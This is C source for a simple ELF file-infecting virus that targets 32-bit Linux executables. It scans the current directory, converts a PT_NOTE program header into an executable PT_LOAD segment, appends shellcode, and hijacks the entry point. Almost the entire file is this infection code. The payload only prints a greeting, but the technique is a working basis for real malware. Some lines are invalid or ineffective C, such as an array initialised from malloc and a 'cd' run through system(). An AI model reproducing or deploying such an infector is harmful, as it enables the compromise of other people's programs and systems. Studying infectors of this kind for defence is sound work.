#include <dirent.h> 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <elf.h>

#define DEBUG 1

char payload [] = {
        0xeb, 0x1e, 0x5f, 0x8B,
        0x34, 0x24, 0x83, 0xEE, 0x06, 0x29,
        0xC0, 0x29, 0xDB, 0x29, 0xD2, 0xB0, 0x04, 0xB3, 0x01, 0x89, 0xF9, 0xB2,
        0x1C, 0xCD, 0x80, 0x29, 0xC0, 0x29, 0xDB, 0xB0, 0x01, 0xC3,
        0xe8, 0xdd, 0xFF, 0xFF, 0xFF, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x21, 0x20, 0x49,
        0x20, 0x61, 0x6D, 0x20, 0x61, 0x20, 0x73, 0x69, 0x6D, 0x70, 0x6C, 0x65,
        0x20, 0x76, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0A, 0x00
};


int infect(int argc, char ** argv){
	//printf("Argv0: %s\n", argv[0]);
	FILE *fp;
	DIR *d;
	struct dirent *dir;
	char magic_word[] = {0x7f, 0x45, 0x4C, 0x46}; //DEL,E,L,F

	FILE * fpvirus;
	system("cp virus.c /tmp");
	system("cd /tmp");
	system("gcc -c -o virus.o virus.c");
	system("objcopy -O binary virus.o virus.bin");
	system("hexdump -C virus.bin | grep --color=auto '00'");
	system("cd -");
	char buf [] = malloc(sizeof(char)*1000);
	
	
		
	char pre_payload []= {
		0x50, 0x53, 0x51, 0x52, 0x56, 0x57,
		0xe8, '.', '.', '.', '.', 
		0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58,
		0xe9, '.', '.', '.', '.'
	};
	int * pre_payload_virus_jmp = (int *) pre_payload+7;
	int * pre_payload_original_jmp = (int *) pre_payload_virus_jmp+11;

	int pre_payload_size = sizeof(pre_payload)/sizeof(pre_payload[0]);
	int payload_size = sizeof(payload)/sizeof(payload[0]);

	Elf32_Ehdr * header = malloc(sizeof(Elf32_Ehdr));//ELF Header
	d = opendir(".");
	if(d) {
		//if directory exists
		int found_infectable_file = 0;
		while((dir = readdir(d)) != NULL){
			//loop over all files in directory
			
			char * filename = malloc( sizeof(char) * (strlen(dir->d_name)+2) );
			filename[0] = '.';
			filename[1] = '/';
			filename[2] = '\0';
			strcat(filename, dir->d_name);
			//printf("Filename: %s\n", filename);
			//printf("Filename: %s\n", argv[0]);
			//make sure not to modify self
			if(strcmp(dir->d_name, argv[0]) == 0
				|| strcmp(filename, argv[0]) ==0){
				if(DEBUG)printf("Virus does not modify self\n");
				//continue;
			}
			fp = fopen(dir->d_name,"r+");
			if(fp!=NULL){
				fread(header,sizeof(Elf32_Ehdr),1,fp);
				if(strncmp(header->e_ident,magic_word,4) == 0 && header->e_type == 2){
					if(DEBUG)printf("%s \t%s \t%d \t%x\n",dir->d_name,header->e_ident,header->e_type, header->e_entry);
					Elf32_Addr old_entry_point = header->e_entry; //store old entry point
					int * pre_payload_code_offset = (int *)(pre_payload+7);
					Elf32_Addr * pre_payload_old_entry_point = (Elf32_Addr *)(pre_payload + 18);
					//prepare loop
					Elf32_Phdr phdr;//program header table
					int objectsread;
					int numloadsegments;
					int payload_offset, payload_address;
					int adjustment;

					int i;
					if(DEBUG)printf("Looking for NOTE header\n");
					for(i = 0 ; i < header->e_phnum ; i++){
						//printf("Reading %i\n", i);
						objectsread = fread(&phdr, sizeof(Elf32_Phdr), 1, fp);
						//printf("Done Reading %i\n", i);
						if(phdr.p_type == PT_NOTE){
							if(DEBUG)printf("Found NOTE program header\n");
							found_infectable_file = 1;
				
							//calculate new offset for our code
							fseek(fp, 0, SEEK_END);//offset to end of file, where our code is
							payload_offset = ftell(fp);
							phdr.p_offset = payload_offset;
							payload_address = 0x08048000 - (payload_size + pre_payload_size);
							//???
							adjustment = payload_offset % 0x1000 - payload_address % 0x1000;
							if(adjustment>0)payload_address -= 0x1000;
							payload_address += adjustment;
							//set the new jump point where our code is
							header->e_entry = payload_address;
	
							//modify NOTE section to a LOAD section
							phdr.p_type = PT_LOAD;
							phdr.p_vaddr = phdr.p_paddr = payload_address;
							phdr.p_filesz = phdr.p_memsz = payload_size + pre_payload_size;
							phdr.p_flags = PF_R | PF_X;
							phdr.p_align = 0x1000;
							
							//write new phdr to storage
							fseek(fp, header->e_phoff + i*header->e_phentsize, SEEK_SET);
							fwrite (&phdr, sizeof(Elf32_Phdr) , 1 , fp);

							//modify pre_payload jump-points
							
							//pre_payload_virus_jmp[0] = payload_address;
							//pre_payload_original_jmp[0] = old_entry_point;

							*pre_payload_code_offset = 0 + (pre_payload_size - 11);
							*pre_payload_old_entry_point = old_entry_point - (payload_address + pre_payload_size);

							//if(DEBUG)printf("Virus location: 0x%lx = 0x%x\n", pre_payload_virus_jmp[0], payload_address);
							//if(DEBUG)printf("Orignal code location: 0x%lx = 0x%lx\n", pre_payload_original_jmp[0], old_entry_point);

							//write payload and pre_payload
							fseek(fp, payload_offset, SEEK_SET);
							fwrite(&pre_payload, sizeof(pre_payload), 1, fp);
							fwrite(&payload, sizeof(payload), 1, fp);

							//change first jump
							fseek(fp, 0, SEEK_SET);
							fwrite(header, sizeof(Elf32_Ehdr), 1, fp);
							break;
						}//ENDIF PT_NOTE
						//printf("End Loop %i\n", i);
					}//END_FOR
					//printf("Loop done\n");
				}//ENDIF strcmp; ELF file
				if(DEBUG)printf("Closing file\n");
				//closing file again
				fclose(fp);
				if(DEBUG)printf("Closed file\n");
				if(found_infectable_file){
					break;
				}else{	
					if(DEBUG)printf ("Could not infect file\n");
				}
			}
		}
	}
	closedir(d);

	return 0;
}


int main(int argc, char ** argv){
	infect(argc, argv);
}

